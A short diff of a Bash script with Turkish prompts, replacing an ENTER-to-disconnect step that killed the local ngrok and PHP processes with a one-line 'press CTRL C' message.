@@ -115,16 +115,7 @@ do
 		echo
 		echo
 		echo
-		read -e -p $'\e[97mBAĞLANTIYI KESMEK İÇİN\e[31m ────────── [ \e[97mENTER\e[31m ] >>\e[97m ' enter
-		echo
-		echo
-		echo
-		killall ngrok
-		killall php
-		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
-		echo
-		echo
-		echo
+		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
 		echo
 		echo
 		echo
@@ -153,16 +144,7 @@ do
 		echo
 		echo
 		echo
-		read -e -p $'\e[97mBAĞLANTIYI KESMEK İÇİN\e[31m ────────── [ \e[97mENTER\e[31m ] >>\e[97m ' enter
-		echo
-		echo
-		echo
-		killall ngrok
-		killall php
-		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
-		echo
-		echo
-		echo
+		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
 		echo
 		echo
 		echo
